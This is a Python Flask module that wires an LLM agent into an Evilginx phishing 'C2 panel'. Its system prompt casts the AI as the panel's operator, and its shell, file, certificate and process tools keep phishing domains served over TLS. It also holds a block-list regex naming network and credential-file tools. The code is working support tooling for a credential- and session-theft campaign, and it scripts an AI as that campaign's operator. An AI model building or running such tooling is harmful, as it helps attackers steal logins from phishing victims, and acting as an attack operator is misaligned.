#!/usr/bin/env python3
"""OpenRouter AI assistant for Evilginx operational diagnosis and fix."""

import base64
import json
import os
import re
import ssl
import shutil
import subprocess
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime

from flask import jsonify, request

OR_CHAT = "https://openrouter.ai/api/v1/chat/completions"
OR_MODELS = "https://openrouter.ai/api/v1/models"
CFG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ai_openrouter.json")
THREAD_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ai_thread.json")
CRT_ROOT = "/root/.evilginx/crt"

_READ_ROOTS = (
    "/root/.evilginx",
    "/root/evilginx2",
    "/root/evilginx-panel",
    "/var/log",
    "/etc/systemd/system",
    "/etc/letsencrypt",
    "/proc",
)
_WRITE_ROOTS = (
    "/root/.evilginx",
    "/root/evilginx2/phishlets",
    "/etc/systemd/system",
)
_SECRET_NAMES = (
    "ai_openrouter.json", ".env", "data.db", "linode_proxy.json",
    "notif_settings.json", "ca.key", "privkey.pem", "private.key",
)
_BLOCK_CMD = re.compile(
    r"(rm\s+-rf\s+/($|\s)|mkfs\b|dd\s+if=|:\(\)\s*\{|"
    r"/etc/shadow|\.ssh|authorized_keys|"
    r"ai_openrouter|\.env\b|data\.db|"
    r"\b(wget|curl|nc|ncat|nmap)\b|"
    r"python3?\s+-c|"
    r"\b(shutdown|reboot|halt|poweroff|passwd|useradd|userdel|chpasswd)\b)",
    re.I,
)
_SSL = ssl.create_default_context()
_lock = threading.Lock()
_models_cache = {"t": 0.0, "data": []}

SYSTEM = (
    "You are the on-server AI operator for this Evilginx C2 panel. "
    "Your job is operational: TLS/certificates, Let's Encrypt rate limits, autocert, "
    "Evilginx process, config.json, phishlet enable/hostname, ports, systemd, logs, disk. "
    "When you need data or a change on the machine you MUST call a tool in the same turn. "
    "Never stop after a colon. Never say only 'let me check' / 'сейчас проверю' without a tool call. "
    "Never dump captured sessions, cookies, passwords, JWT, API keys, or .env contents. "
    "Do not rewrite phishlet YAML unless it is invalid JSON/YAML that prevents loading. "
    "Known pattern: autocert ON + many proxy_hosts + Let's Encrypt 50/week 429. "
    "Fix = config autocert off + copy existing wildcard cert from "
    "/root/.evilginx/crt/wildcard/{fullchain.pem,privkey.pem} into "
    "/root/.evilginx/crt/sites/<domain>/ and restart Evilginx. "
    "After tools finish, write a clear summary: what was broken, what you did, what remains. "
    "Reply in the user's language (Russian if they write Russian/translit)."
)

AUTOFIX_USER = (
    "AUTOFIX: inspect this Evilginx server now. Diagnostics JSON is already in this thread. "
    "Fix every operational problem you can with tools, then report results. "
    "Do not reply with only a plan."
)

_INCOMPLETE = re.compile(
    r"(:\s*$)|(\.\.\.\s*$)|(let me (check|look|inspect|see|read|run|verify))|"
    r"(i('ll| will) (check|look|inspect|now))|(one moment)|(hang on)|"
    r"(сейчас (провер|посмотр|глян))|(давай провер)|(минуту)",
    re.I,
)

_job_mu = threading.Lock()
_job = {"id": 0, "running": False, "events": [], "error": None}

TOOLS = [
    {"type": "function", "function": {
        "name": "get_diagnostics",
        "description": "Snapshot of Evilginx process, config, certs, recent logs, ports, hints.",
        "parameters": {"type": "object", "properties": {}},
    }},
    {"type": "function", "function": {
        "name": "list_dir",
        "description": "List a directory on the server.",
        "parameters": {"type": "object", "properties": {
            "path": {"type": "string"},
        }, "required": ["path"]},
    }},
    {"type": "function", "function": {
        "name": "read_file",
        "description": "Read a text file (secrets and session DB are blocked).",
        "parameters": {"type": "object", "properties": {
            "path": {"type": "string"},
            "max_bytes": {"type": "integer"},
        }, "required": ["path"]},
    }},
    {"type": "function", "function": {
        "name": "write_file",
        "description": "Write a text file under allowed Evilginx/cert paths.",
        "parameters": {"type": "object", "properties": {
            "path": {"type": "string"},
            "content": {"type": "string"},
        }, "required": ["path", "content"]},
    }},
    {"type": "function", "function": {
        "name": "run_command",
        "description": "Run a short shell command (destructive/network tools blocked).",
        "parameters": {"type": "object", "properties": {
            "command": {"type": "string"},
        }, "required": ["command"]},
    }},
    {"type": "function", "function": {
        "name": "set_autocert",
        "description": "Set general.autocert true/false in Evilginx config.json.",
        "parameters": {"type": "object", "properties": {
            "enabled": {"type": "boolean"},
        }, "required": ["enabled"]},
    }},
    {"type": "function", "function": {
        "name": "install_wildcard_cert",
        "description": "Copy ~/.evilginx/crt/wildcard into crt/sites/<domain> for unmanaged TLS.",
        "parameters": {"type": "object", "properties": {
            "domain": {"type": "string"},
        }},
    }},
    {"type": "function", "function": {
        "name": "evilginx_control",
        "description": "Start, stop or restart the Evilginx process.",
        "parameters": {"type": "object", "properties": {
            "action": {"type": "string", "enum": ["start", "stop", "restart"]},
        }, "required": ["action"]},
    }},
]


def register(app, auth, egm, read_config, write_config, list_phishlets):
    app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024
    ctx = {
        "egm": egm,
        "read_config": read_config,
        "write_config": write_config,
        "list_phishlets": list_phishlets,
    }

    @app.route("/api/ai/status")
    @auth
    def api_ai_status():
        cfg = _load_cfg()
        out = {
            "configured": bool(cfg.get("api_key")),
            "key_hint": _hint(cfg.get("api_key") or ""),
            "model": cfg.get("model") or "",
            "models": [],
        }
        if out["configured"]:
            try:
                out["models"] = _list_models(cfg["api_key"])
            except Exception as e:
                out["models_error"] = str(e)
        return jsonify(out)

    @app.route("/api/ai/key", methods=["POST"])
    @auth
    def api_ai_key():
        d = request.get_json(silent=True) or {}
        key = (d.get("api_key") or d.get("key") or "").strip()
        if d.get("clear"):
            _save_cfg({"api_key": "", "model": ""})
            _save_thread([])
            return jsonify(ok=True, msg="Key removed")
        if not key:
            return jsonify(error="OpenRouter key required"), 400
        try:
            models = _list_models(key, force=True)
        except Exception as e:
            return jsonify(error="OpenRouter rejected the key: %s" % e), 400
        cfg = _load_cfg()
        model = cfg.get("model") or _pick_default(models)
        ids = {m["id"] for m in models}
        if model not in ids:
            model = _pick_default(models)
        _save_cfg({"api_key": key, "model": model})
        return jsonify(ok=True, key_hint=_hint(key), model=model, models=models)

    @app.route("/api/ai/model", methods=["POST"])
    @auth
    def api_ai_model():
        cfg = _load_cfg()
        if not cfg.get("api_key"):
            return jsonify(error="Add an OpenRouter key first"), 400
        d = request.get_json(silent=True) or {}
        model = (d.get("model") or "").strip()
        if not model:
            return jsonify(error="model required"), 400
        cfg["model"] = model
        _save_cfg(cfg)
        return jsonify(ok=True, model=model)

    @app.route("/api/ai/history", methods=["GET", "DELETE"])
    @auth
    def api_ai_history():
        if request.method == "DELETE":
            if _job["running"]:
                return jsonify(error="Wait until the current job finishes"), 409
            _save_thread([])
            return jsonify(ok=True)
        return jsonify(messages=_ui_history(_load_thread()), running=_job["running"], job_id=_job["id"])

    @app.route("/api/ai/job")
    @auth
    def api_ai_job():
        since = int(request.args.get("since") or 0)
        events = _job["events"]
        return jsonify(
            running=_job["running"],
            job_id=_job["id"],
            error=_job.get("error"),
            since=since,
            events=events[since:],
            total=len(events),
            messages=_ui_history(_load_thread()),
        )

    @app.route("/api/ai/chat", methods=["POST"])
    @auth
    def api_ai_chat():
        return _start_job(ctx, autofix=False)

    @app.route("/api/ai/autofix", methods=["POST"])
    @auth
    def api_ai_autofix():
        return _start_job(ctx, autofix=True)


def _load_cfg():
    try:
        with open(CFG_PATH) as f:
            return json.load(f)
    except Exception:
        return {"api_key": "", "model": ""}


def _save_cfg(cfg):
    tmp = CFG_PATH + ".tmp"
    with open(tmp, "w") as f:
        json.dump(cfg, f)
    os.replace(tmp, CFG_PATH)
    try:
        os.chmod(CFG_PATH, 0o600)
    except Exception:
        pass


def _load_thread():
    try:
        with open(THREAD_PATH) as f:
            data = json.load(f)
        return data if isinstance(data, list) else []
    except Exception:
        return []


def _save_thread(msgs):
    tmp = THREAD_PATH + ".tmp"
    with open(tmp, "w") as f:
        json.dump(msgs[-80:], f)
    os.replace(tmp, THREAD_PATH)


def _hint(key):
    key = key or ""
    if len(key) < 12:
        return ""
    return key[:7] + "…" + key[-4:]


def _http(method, url, headers, body=None, timeout=120):
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_SSL) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read() or b""


def _list_models(key, force=False):
    now = time.time()
    if not force and _models_cache["data"] and now - _models_cache["t"] < 120:
        return _models_cache["data"]
    status, raw = _http("GET", OR_MODELS, {
        "Authorization": "Bearer " + key,
        "Accept": "application/json",
    }, timeout=30)
    if status != 200:
        raise RuntimeError(_err_text(raw) or ("HTTP %s" % status))
    data = json.loads(raw.decode("utf-8", "replace")).get("data") or []
    out = []
    for m in data:
        mid = m.get("id") or ""
        if not mid:
            continue
        arch = m.get("architecture") or {}
        mods = arch.get("input_modalities") or []
        pricing = m.get("pricing") or {}
        prompt = str(pricing.get("prompt") or "0")
        try:
            free = float(prompt) == 0.0
        except Exception:
            free = False
        out.append({
            "id": mid,
            "name": m.get("name") or mid,
            "vision": "image" in mods or "image" in str(arch.get("modality") or ""),
            "free": free,
        })
    out.sort(key=lambda x: (not x["free"], x["id"]))
    _models_cache["t"] = now
    _models_cache["data"] = out
    return out


def _pick_default(models):
    ids = [m["id"] for m in models]
    for pref in (
        "anthropic/claude-sonnet-4",
        "anthropic/claude-3.7-sonnet",
        "openai/gpt-4o",
        "google/gemini-2.5-flash",
        "openai/gpt-4o-mini",
        "google/gemini-flash-1.5",
    ):
        if pref in ids:
            return pref
    for m in models:
        if m.get("free"):
            return m["id"]
    return ids[0] if ids else ""


def _err_text(raw):
    try:
        j = json.loads(raw.decode("utf-8", "replace"))
        err = j.get("error")
        if isinstance(err, dict):
            return err.get("message") or str(err)
        if err:
            return str(err)
    except Exception:
        pass
    return (raw or b"")[:400].decode("utf-8", "replace")


def _ui_history(thread):
    ui = []
    for m in thread:
        role = m.get("role")
        kind = m.get("kind") or ""
        if m.get("tool_calls"):
            continue
        if role == "tool" or kind == "tool":
            ui.append({
                "role": "tool",
                "name": m.get("name") or "tool",
                "text": m.get("content") or m.get("text") or "",
                "state": m.get("state") or "ok",
                "ts": m.get("ts"),
            })
            continue
        if role == "status" or kind == "status":
            ui.append({"role": "status", "text": m.get("content") or m.get("text") or "", "ts": m.get("ts")})
            continue
        if role not in ("user", "assistant"):
            continue
        text, atts = _flatten_content(m.get("content"))
        if not text and not atts:
            continue
        ui.append({"role": role, "text": text, "attachments": atts, "ts": m.get("ts")})
    return ui[-80:]


def _flatten_content(content):
    if isinstance(content, str):
        return content, []
    if not isinstance(content, list):
        return str(content or ""), []
    parts, atts = [], []
    for p in content:
        if not isinstance(p, dict):
            continue
        if p.get("type") in ("text", "output_text"):
            parts.append(p.get("text") or "")
        elif p.get("type") == "image_url":
            atts.append("image")
        elif p.get("type") == "file":
            atts.append(p.get("name") or "file")
    return "\n".join(parts).strip(), atts


def _emit(ev):
    ev = dict(ev)
    ev.setdefault("ts", datetime.utcnow().isoformat() + "Z")
    with _job_mu:
        _job["events"].append(ev)
    kind = ev.get("type")
    if kind in ("assistant", "user", "tool", "status"):
        thread = _load_thread()
        if kind == "assistant":
            thread.append({"role": "assistant", "content": ev.get("text") or "", "ts": ev["ts"]})
        elif kind == "user":
            pass
        elif kind == "tool":
            thread.append({
                "role": "tool", "kind": "tool",
                "name": ev.get("name") or "tool",
                "content": ev.get("detail") or ev.get("text") or "",
                "state": ev.get("state") or "ok",
                "ts": ev["ts"],
            })
        elif kind == "status":
            thread.append({"role": "status", "kind": "status", "content": ev.get("text") or "", "ts": ev["ts"]})
        _save_thread(thread[-80:])


def _start_job(ctx, autofix=False):
    cfg = _load_cfg()
    if not cfg.get("api_key"):
        return jsonify(error="Add an OpenRouter API key first"), 400
    if not cfg.get("model"):
        return jsonify(error="Select a model first"), 400
    body = request.get_json(silent=True) or {}
    user_text = (body.get("message") or body.get("text") or "").strip()
    attachments = body.get("attachments") or []
    if autofix:
        user_text = AUTOFIX_USER
        attachments = []
    elif not user_text and not attachments:
        return jsonify(error="Message is empty"), 400

    user_msg = _build_user_message(user_text, attachments)
    user_msg["ts"] = datetime.utcnow().isoformat() + "Z"

    if not _lock.acquire(blocking=False):
        return jsonify(error="AI is already working — wait for the current job"), 409
    with _job_mu:
        _job["id"] = int(_job["id"] or 0) + 1
        _job["running"] = True
        _job["events"] = []
        _job["error"] = None
        job_id = _job["id"]
    thread = _load_thread()
    thread.append(user_msg)
    _save_thread(thread)
    t = threading.Thread(target=_worker, args=(ctx, cfg, autofix, user_msg, job_id), daemon=True)
    t.start()
    return jsonify(ok=True, running=True, job_id=job_id)


def _worker(ctx, cfg, autofix, user_msg, job_id):
    try:
        _emit({"type": "status", "text": "OpenRouter · %s" % (cfg.get("model") or "")})
        api_msgs = _api_messages(_load_thread())
        if autofix:
            _emit({"type": "status", "text": "Collecting server diagnostics…"})
            diag = _diagnostics(ctx)
            hints = diag.get("hints") or []
            _emit({
                "type": "tool", "name": "get_diagnostics", "state": "ok",
                "detail": "snapshot · hints: %s" % (", ".join(hints) if hints else "none"),
            })
            api_msgs.append({
                "role": "user",
                "content": (
                    "Diagnostics JSON (already collected, do not only narrate):\n"
                    + json.dumps(diag, ensure_ascii=False)[:14000]
                    + "\n\nCall tools to fix. Final answer only after tools."
                ),
            })
        reply, err = _loop(cfg, api_msgs, ctx, autofix=autofix)
        if err:
            _job["error"] = err
            _emit({"type": "error", "text": err})
            return
        _emit({"type": "done", "text": "Done"})
    except Exception as e:
        _job["error"] = str(e)
        _emit({"type": "error", "text": str(e)})
    finally:
        _job["running"] = False
        try:
            _lock.release()
        except Exception:
            pass


def _split_message(msg):
    tool_calls = list(msg.get("tool_calls") or [])
    parts = []
    content = msg.get("content")
    if isinstance(content, str) and content.strip():
        parts.append(content.strip())
    elif isinstance(content, list):
        for block in content:
            if not isinstance(block, dict):
                continue
            btype = (block.get("type") or "").lower()
            if btype in ("text", "output_text"):
                if block.get("text"):
                    parts.append(block.get("text"))
            elif btype in ("tool_use", "function_call", "tool_call"):
                fn = block.get("name") or ((block.get("function") or {}).get("name"))
                args = block.get("input")
                if args is None:
                    args = block.get("arguments") or {}
                if not isinstance(args, str):
                    args = json.dumps(args)
                tool_calls.append({
                    "id": block.get("id") or fn or "tool",
                    "type": "function",
                    "function": {"name": fn or "", "arguments": args},
                })
    return "\n".join(parts).strip(), tool_calls


def _looks_incomplete(text, tool_calls):
    if tool_calls:
        return False
    t = (text or "").strip()
    if not t:
        return True
    return bool(_INCOMPLETE.search(t))


def _loop(cfg, messages, ctx, autofix=False, max_rounds=12):
    last_text = ""
    nudges = 0
    for rnd in range(max_rounds):
        choice_mode = "auto"
        if autofix and rnd == 0:
            choice_mode = "required"
        elif nudges:
            choice_mode = "required"
        _emit({"type": "status", "text": "Model thinking… (step %s)" % (rnd + 1)})
        payload = {
            "model": cfg["model"],
            "messages": messages,
            "tools": TOOLS,
            "tool_choice": choice_mode,
            "temperature": 0.2,
        }
        status, raw = _http("POST", OR_CHAT, {
            "Authorization": "Bearer " + cfg["api_key"],
            "Content-Type": "application/json",
            "HTTP-Referer": "http://127.0.0.1:8443/",
            "X-Title": "Evilginx C2 AI Assistant",
        }, body=json.dumps(payload).encode("utf-8"), timeout=120)
        if status != 200:
            err = _err_text(raw) or ("OpenRouter HTTP %s" % status)
            if choice_mode == "required" and "tool" in err.lower():
                payload["tool_choice"] = "auto"
                status, raw = _http("POST", OR_CHAT, {
                    "Authorization": "Bearer " + cfg["api_key"],
                    "Content-Type": "application/json",
                    "HTTP-Referer": "http://127.0.0.1:8443/",
                    "X-Title": "Evilginx C2 AI Assistant",
                }, body=json.dumps(payload).encode("utf-8"), timeout=120)
                if status != 200:
                    return "", _err_text(raw) or err
            else:
                return "", err
        data = json.loads(raw.decode("utf-8", "replace"))
        choice = (data.get("choices") or [{}])[0]
        msg = choice.get("message") or {}
        text, tool_calls = _split_message(msg)
        if text:
            last_text = text
            _emit({"type": "assistant", "text": text})
        if tool_calls:
            messages.append({
                "role": "assistant",
                "content": text or "",
                "tool_calls": tool_calls,
            })
            for tc in tool_calls:
                fn = ((tc.get("function") or {}).get("name") or "").strip()
                raw_args = (tc.get("function") or {}).get("arguments") or "{}"
                try:
                    args = json.loads(raw_args) if isinstance(raw_args, str) else (raw_args or {})
                except Exception:
                    args = {}
                _emit({"type": "tool", "name": fn or "tool", "state": "run",
                       "detail": "starting…"})
                result = _exec_tool(fn, args if isinstance(args, dict) else {}, ctx)
                ok = not str(result).startswith("ERROR")
                preview = re.sub(r"\s+", " ", str(result))[:220]
                _emit({
                    "type": "tool", "name": fn or "tool",
                    "state": "ok" if ok else "err",
                    "detail": preview,
                })
                messages.append({
                    "role": "tool",
                    "tool_call_id": tc.get("id") or fn,
                    "content": result[:24000],
                })
            continue
        parsed = _parse_actions_fallback(text)
        if parsed:
            last_text, extra = parsed
            for act in extra:
                fn = act["name"]
                args = act.get("arguments") or {}
                _emit({"type": "tool", "name": fn, "state": "run", "detail": "starting…"})
                result = _exec_tool(fn, args, ctx)
                ok = not str(result).startswith("ERROR")
                _emit({
                    "type": "tool", "name": fn,
                    "state": "ok" if ok else "err",
                    "detail": re.sub(r"\s+", " ", str(result))[:220],
                })
            continue
        if _looks_incomplete(text, tool_calls) and nudges < 3:
            nudges += 1
            _emit({"type": "status", "text": "Reply stalled — continuing, requiring a tool call (%s/3)" % nudges})
            messages.append({"role": "assistant", "content": text or ""})
            messages.append({
                "role": "user",
                "content": "Stop narrating. Call a tool now. If nothing is left to fix, write the final summary without a trailing colon.",
            })
            continue
        return last_text, None
    return last_text or "Stopped after max tool rounds. Ask me to continue.", None


def _build_user_message(text, attachments):
    content = []
    extra = []
    for att in attachments[:8]:
        if not isinstance(att, dict):
            continue
        name = (att.get("name") or "file")[:80]
        mime = (att.get("mime") or "").lower()
        data = att.get("data") or ""
        if "," in data and data.strip().startswith("data:"):
            header, b64 = data.split(",", 1)
            mime = mime or header.split(";")[0].replace("data:", "")
        else:
            b64 = data
        if mime.startswith("image/"):
            url = data if data.startswith("data:") else ("data:%s;base64,%s" % (mime, b64))
            content.append({"type": "image_url", "image_url": {"url": url}})
            extra.append("Attached image: " + name)
            continue
        try:
            raw = base64.b64decode(b64, validate=False)
        except Exception:
            extra.append("Could not decode file " + name)
            continue
        if len(raw) > 200_000:
            extra.append("File %s skipped (too large)" % name)
            continue
        body = raw.decode("utf-8", "replace")
        extra.append("Attached file %s:\n```\n%s\n```" % (name, body[:16000]))
    blob = (text or "").strip()
    if extra:
        blob = (blob + "\n\n" if blob else "") + "\n\n".join(extra)
    if blob:
        content.insert(0, {"type": "text", "text": blob})
    if not content:
        content = [{"type": "text", "text": text or "(empty)"}]
    return {"role": "user", "content": content if len(content) > 1 or content[0].get("type") != "text" else blob}


def _api_messages(thread):
    msgs = [{"role": "system", "content": SYSTEM}]
    for m in thread[-24:]:
        role = m.get("role")
        if role not in ("user", "assistant"):
            continue
        if m.get("tool_calls") or m.get("kind") in ("tool", "status"):
            continue
        msgs.append({"role": role, "content": m.get("content")})
    return msgs


def _parse_actions_fallback(text):
    if not text:
        return None
    m = re.search(r"\{[\s\S]*\"actions\"[\s\S]*\}", text)
    if not m:
        return None
    try:
        j = json.loads(m.group(0))
    except Exception:
        return None
    acts = []
    for a in j.get("actions") or []:
        if isinstance(a, dict) and a.get("name"):
            acts.append({"name": a["name"], "arguments": a.get("arguments") or a.get("args") or {}})
    if not acts:
        return None
    return j.get("reply") or re.sub(r"```json[\s\S]*```", "", text).strip(), acts


def _exec_tool(name, args, ctx):
    try:
        if name == "get_diagnostics":
            return json.dumps(_diagnostics(ctx), ensure_ascii=False, indent=2)
        if name == "list_dir":
            return _list_dir(args.get("path") or "")
        if name == "read_file":
            return _read_file(args.get("path") or "", int(args.get("max_bytes") or 60000))
        if name == "write_file":
            return _write_file(args.get("path") or "", args.get("content") or "")
        if name == "run_command":
            return _run_cmd(args.get("command") or "")
        if name == "set_autocert":
            return _set_autocert(bool(args.get("enabled")), ctx)
        if name == "install_wildcard_cert":
            return _install_wildcard(args.get("domain") or "", ctx)
        if name == "evilginx_control":
            return _egx(args.get("action") or "", ctx)
        return "ERROR: unknown tool %s" % name
    except Exception as e:
        return "ERROR: %s" % e


def _realpath(path):
    path = os.path.abspath(os.path.expanduser(path or ""))
    return os.path.realpath(path)


def _allowed(path, roots):
    path = _realpath(path)
    for root in roots:
        root = os.path.realpath(root)
        if path == root or path.startswith(root + os.sep):
            return path
    return None


def _secret_file(path):
    base = os.path.basename(path)
    if base in _SECRET_NAMES:
        return True
    if base.endswith((".key", ".pem")) and "fullchain" not in base.lower() and "ca.crt" not in base.lower():
        return True
    return False


def _list_dir(path):
    path = _allowed(path, _READ_ROOTS)
    if not path:
        return "ERROR: path not allowed"
    if not os.path.isdir(path):
        return "ERROR: not a directory"
    rows = []
    for name in sorted(os.listdir(path))[:200]:
        p = os.path.join(path, name)
        kind = "dir" if os.path.isdir(p) else "file"
        try:
            sz = os.path.getsize(p) if kind == "file" else 0
        except Exception:
            sz = 0
        rows.append("%s\t%s\t%s" % (kind, sz, name))
    return "\n".join(rows) or "(empty)"


def _read_file(path, max_bytes):
    path = _allowed(path, _READ_ROOTS)
    if not path:
        return "ERROR: path not allowed"
    if _secret_file(path):
        return "ERROR: refusing to read secret file"
    if not os.path.isfile(path):
        return "ERROR: not a file"
    max_bytes = max(1024, min(max_bytes, 120000))
    with open(path, "rb") as f:
        raw = f.read(max_bytes + 1)
    note = ""
    if len(raw) > max_bytes:
        raw = raw[:max_bytes]
        note = "\n… truncated …"
    return raw.decode("utf-8", "replace") + note


def _write_file(path, content):
    path = _allowed(path, _WRITE_ROOTS)
    if not path:
        return "ERROR: path not allowed"
    if _secret_file(path) and os.path.basename(path) != "privkey.pem":
        return "ERROR: refusing to overwrite secret file"
    if "data.db" in path or path.endswith(".env"):
        return "ERROR: blocked"
    os.makedirs(os.path.dirname(path) or "/", exist_ok=True)
    data = content.encode("utf-8")
    if len(data) > 512_000:
        return "ERROR: file too large"
    tmp = path + ".tmp"
    with open(tmp, "wb") as f:
        f.write(data)
    os.replace(tmp, path)
    if path.endswith("privkey.pem") or path.endswith(".key"):
        os.chmod(path, 0o600)
    return "wrote %s (%d bytes)" % (path, len(data))


def _run_cmd(command):
    command = (command or "").strip()
    if not command:
        return "ERROR: empty command"
    if _BLOCK_CMD.search(command):
        return "ERROR: command blocked"
    try:
        p = subprocess.run(
            command, shell=True, cwd="/root",
            capture_output=True, timeout=45,
            env={**os.environ, "DEBIAN_FRONTEND": "noninteractive"},
        )
    except subprocess.TimeoutExpired:
        return "ERROR: timeout"
    out = (p.stdout or b"") + (b"\n" + p.stderr if p.stderr else b"")
    text = out.decode("utf-8", "replace")[-12000:]
    return "exit %s\n%s" % (p.returncode, text)


def _set_autocert(enabled, ctx):
    cfg = ctx["read_config"]()
    g = cfg.setdefault("general", {})
    g["autocert"] = bool(enabled)
    ctx["write_config"](cfg)
    return "autocert is now %s" % ("on" if enabled else "off")


def _install_wildcard(domain, ctx):
    cfg = ctx["read_config"]()
    domain = (domain or cfg.get("general", {}).get("domain") or "").strip().lower()
    src = os.path.join(CRT_ROOT, "wildcard")
    chain = os.path.join(src, "fullchain.pem")
    key = os.path.join(src, "privkey.pem")
    if not os.path.isfile(chain) or not os.path.isfile(key):
        return "ERROR: no wildcard pair at %s" % src
    dest_name = domain or "wildcard"
    dst = os.path.join(CRT_ROOT, "sites", dest_name)
    os.makedirs(dst, exist_ok=True)
    shutil.copy2(chain, os.path.join(dst, "fullchain.pem"))
    shutil.copy2(key, os.path.join(dst, "privkey.pem"))
    os.chmod(os.path.join(dst, "privkey.pem"), 0o600)
    info = _cert_info(os.path.join(dst, "fullchain.pem"))
    g = cfg.setdefault("general", {})
    g["autocert"] = False
    ctx["write_config"](cfg)
    return "installed wildcard into %s; autocert off; %s" % (dst, info)


def _egx(action, ctx):
    egm = ctx["egm"]
    action = (action or "").lower().strip()
    if action == "start":
        egm.start()
    elif action == "stop":
        egm.stop()
    elif action == "restart":
        egm.restart()
    else:
        return "ERROR: action must be start, stop or restart"
    time.sleep(1.2)
    return "evilginx %s — running=%s pid=%s" % (action, egm.alive(), egm.pid())


def _cert_info(path):
    try:
        p = subprocess.run(
            ["openssl", "x509", "-in", path, "-noout", "-subject", "-dates", "-ext", "subjectAltName"],
            capture_output=True, timeout=8,
        )
        return (p.stdout or b"").decode("utf-8", "replace").strip() or "openssl failed"
    except Exception as e:
        return str(e)


def _diagnostics(ctx):
    egm = ctx["egm"]
    cfg = ctx["read_config"]()
    g = cfg.get("general") or {}
    ph = {}
    for name, v in (cfg.get("phishlets") or {}).items():
        if isinstance(v, dict):
            ph[name] = {
                "enabled": v.get("enabled"),
                "hostname": v.get("hostname"),
                "visible": v.get("visible"),
            }
    logs = "".join(egm.output_buffer[-120:] if egm.output_buffer else [])[-8000:]
    logs = re.sub(r"(password|passwd|cookie|jwt|token)[^\n]{0,200}", r"\1=[redacted]", logs, flags=re.I)
    certs = {"wildcard": {}, "sites": []}
    wchain = os.path.join(CRT_ROOT, "wildcard", "fullchain.pem")
    wkey = os.path.join(CRT_ROOT, "wildcard", "privkey.pem")
    certs["wildcard"] = {
        "fullchain": os.path.isfile(wchain),
        "privkey": os.path.isfile(wkey),
        "info": _cert_info(wchain) if os.path.isfile(wchain) else "",
    }
    sites = os.path.join(CRT_ROOT, "sites")
    if os.path.isdir(sites):
        for name in sorted(os.listdir(sites)):
            d = os.path.join(sites, name)
            if not os.path.isdir(d):
                continue
            chain = os.path.join(d, "fullchain.pem")
            certs["sites"].append({
                "name": name,
                "files": os.listdir(d),
                "info": _cert_info(chain) if os.path.isfile(chain) else "",
            })
    hosts_n = {}
    try:
        for p in ctx["list_phishlets"]():
            if p.get("enabled"):
                hosts_n[p["name"]] = len(p.get("proxy_hosts") or [])
    except Exception:
        pass
    hints = []
    if g.get("autocert", True) and certs["wildcard"].get("fullchain") and not certs["sites"]:
        hints.append("Wildcard cert exists but crt/sites is empty while autocert is on — LE will try every hostname.")
    if re.search(r"too many certificates|rateLimited|failed to set up TLS", logs, re.I):
        hints.append("Let's Encrypt rate-limit / TLS setup failure in logs.")
    if not egm.alive():
        hints.append("Evilginx process is not running.")
    ports = _run_cmd("ss -lntup | grep -E ':443|:53 |:8443' || netstat -lntup 2>/dev/null | grep -E ':443|:53 |:8443'")
    return {
        "time": datetime.utcnow().isoformat() + "Z",
        "evilginx": {"running": bool(egm.alive()), "pid": egm.pid()},
        "config": {
            "domain": g.get("domain"),
            "external_ipv4": g.get("external_ipv4"),
            "https_port": g.get("https_port"),
            "dns_port": g.get("dns_port"),
            "autocert": g.get("autocert"),
            "blacklist": (cfg.get("blacklist") or {}).get("mode"),
            "phishlets": ph,
            "enabled_proxy_host_counts": hosts_n,
        },
        "certs": certs,
        "hints": hints,
        "ports": ports[-3000:],
        "logs_tail": logs,
    }
